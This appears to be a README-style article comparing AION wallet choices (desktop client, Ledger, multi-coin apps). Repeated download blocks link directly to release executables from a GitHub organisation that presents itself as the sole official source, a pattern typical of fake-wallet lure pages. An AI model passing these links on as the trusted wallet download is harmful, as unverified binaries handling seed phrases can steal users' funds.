![Aion Wallet](assets/banner-article.png)

# Aion crypto wallet choices: which client to use

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

For most AION holders the practical choice is between the Aion desktop wallet, a hardware device used with it, and a third-party multi-coin wallet, and only the first two are built specifically for this network.

The comparison below is about fit rather than ranking. Each option is described by what it holds, what it can do with AION, and where it stops, so the decision follows from your own situation instead of from a feature count.

## You'll see this if

- You are choosing a wallet for AION for the first time.
- You hold AION in a multi-coin app and are wondering what you are missing.
- You want hardware signing and are not sure whether the desktop wallet supports it.
- You have been told that a popular wallet "supports Aion" and want to check what that means.

## The Aion desktop wallet

This is the client built for the network, and it is the only one in this list that shows staking, delegation and the thaw in the same place as the balance.

It is non-custodial, it runs on Windows, macOS and Linux, and it stores keys locally. It handles 0xa0 addresses natively, imports keystore files from earlier builds, and restores from 12-word or 24-word BIP-39 phrases.

Its limits are the limits of a desktop application: no mobile build, and no browser integration. If you need to sign inside a web page, this is not the tool for that.

## A hardware device with it

The Aion application on a Ledger device works with the desktop wallet, so signing happens on the device while the keys stay on it. That is the strongest arrangement available for AION today and the one to choose if the balance is large enough to justify a device.

It does not replace a backup. The device's own recovery phrase is what restores it, and the desktop wallet still has to be installed and updated.

The [Aion wallet with Ledger](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-with-ledger.md) guide covers the pairing and the parts people find surprising.

## Third-party multi-coin wallets

These are convenient and they are not Aion-specific, which is the whole trade. A wallet that supports twenty chains will show an AION balance and send it, but it will not show a delegation, a pool commission or a thaw, because those are network features rather than generic token functions.

Support also moves. Trust Wallet ended native Aion blockchain support in January 2024, which is a concrete example of a multi-coin wallet removing a network after users had relied on it. Any multi-coin option is worth checking against its current published network list rather than against a review from three years ago.

EVM-only wallets are a separate case. MetaMask and similar tools work with EVM chains, and Aion is not one, so an AION balance will not appear there no matter how the wallet is configured.

## What actually decides it

If you stake, delegate or mine, use the desktop wallet: the staking screens and the reward view are the reason it exists.

If you hold a large balance and sign rarely, add a hardware device and use the desktop wallet as the companion.

If you need a small spending balance on a phone, a multi-coin app may be acceptable, provided it currently lists Aion and you keep the phrase backed up outside it.

If you need to interact with a web application, check which chain it runs on before assuming a wallet will connect.

## Moving between them

An AION balance moves between wallets by restoring the same phrase, not by sending coins to a new address. That keeps the address, the history and any delegation intact.

Restoring the phrase into a multi-coin app works only if that app derives Aion addresses the same way and still supports the network. When it does not, the balance appears empty and the coins are not lost; they are simply not being read. The [Aion wallet zero balance after login](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-zero-balance.md) guide is the check to run.

Before you install anything, decide which one you are installing. The [Aion Wallet explained](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-explained.md) article covers the desktop client in detail, and the [Aion wallet download verify](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-download-verify.md) guide is the check that separates the published build from a file that merely shares its name.

## Prevention

Choose the wallet by the job, not by the brand. A staking position needs a client that understands staking; a spending balance needs something you can carry.

Keep the phrase independent of any application. A wallet is replaceable; the phrase is the account.

Re-check third-party support once a year. Networks get dropped quietly, and the announcement usually arrives after the fact.

## Frequently asked questions

### Can I use MetaMask for AION?

No. MetaMask is built for EVM networks and Aion is a separate chain with its own address format.

### Does Trust Wallet still support AION?

Native support ended in January 2024. Treat any guide that says otherwise as out of date.

### Which wallet shows staking rewards?

The Aion desktop wallet shows the delegation and the reward position. Multi-coin wallets generally show only the token balance.

### Can I use more than one wallet for the same AION?

Yes, if they restore the same phrase. Both then control the same address, so a compromise of either affects the funds.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion Wallet explained](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-explained.md) - what the desktop client is and does.
- [Aion wallet with Ledger](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-with-ledger.md) - hardware signing in practice.
- [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) - moving a wallet between clients.
- [Aion ERC-20 or mainnet](https://github.com/aion-wallet/aion-explained/blob/main/aion-erc-20-or-mainnet.md) - which token form a wallet must support.
